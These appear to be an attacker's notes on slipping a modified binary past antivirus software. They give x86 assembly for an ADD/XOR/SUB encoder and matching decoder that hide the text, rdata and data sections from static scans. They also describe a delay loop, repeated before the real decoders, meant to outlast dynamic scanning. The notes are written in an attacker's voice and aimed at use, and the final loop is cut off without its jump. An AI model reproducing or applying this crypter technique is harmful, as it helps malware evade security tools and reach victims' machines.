REMEMBER, sometimes you might need to encode more than one section to avoid being detected.
For example, in the article, they had to encode the text, rdata, and data section to avoid detection.
This means that he created 3 different decoders/encoders before pushing/jumping back to normal execution.

Simple encoder:
          + 3 operation
          + An Addition
          + XOR 
          + subtraction
   
ENCODER:

MOV EAX, {ADDRESS OF THE START OF WHERE YOU WANT TO ENCODE IT}
ADD BYTE PTR DS:[EAX],12
XOR BYTE PTR DS:[EAX],3E
SUB BYTE PTR DS:[EAX],11
INC EAX
CMP EAX, {ADDRESS OF THE END OF WHERE YOU WANT TO ENCODE IT}
JLE SHORT {BACK TO THE ADD INSTRUCTION}


DECODER:

MOV EAX, {ADDRESS OF THE START OF WHERE YOU WANT TO ENCODE IT}
ADD BYTE PTR DS:[EAX],11
XOR BYTE PTR DS:[EAX],3E
SUB BYTE PTR DS:[EAX],12
INC EAX
CMP EAX, {ADDRESS OF THE END OF WHERE YOU WANT TO ENCODE IT}
JLE SHORT {BACK TO THE ADD INSTRUCTION}


GREAT, WE BYPASSED THE STATIC SCAN... NOW HOW DO WE PASS THE DYNAMIC SCAN?

Add a delay to let some seconds pass while AV is scanning the file, we will reach the maximum time scan allowed for scanning a singel file and the scan is going to stop.

Repeat this code 10 times before we execute the binary:
(BEFORE YOUR REAL DECODERS)

XOR EAX, EAX

INC EAX
CMP EAX,12341234
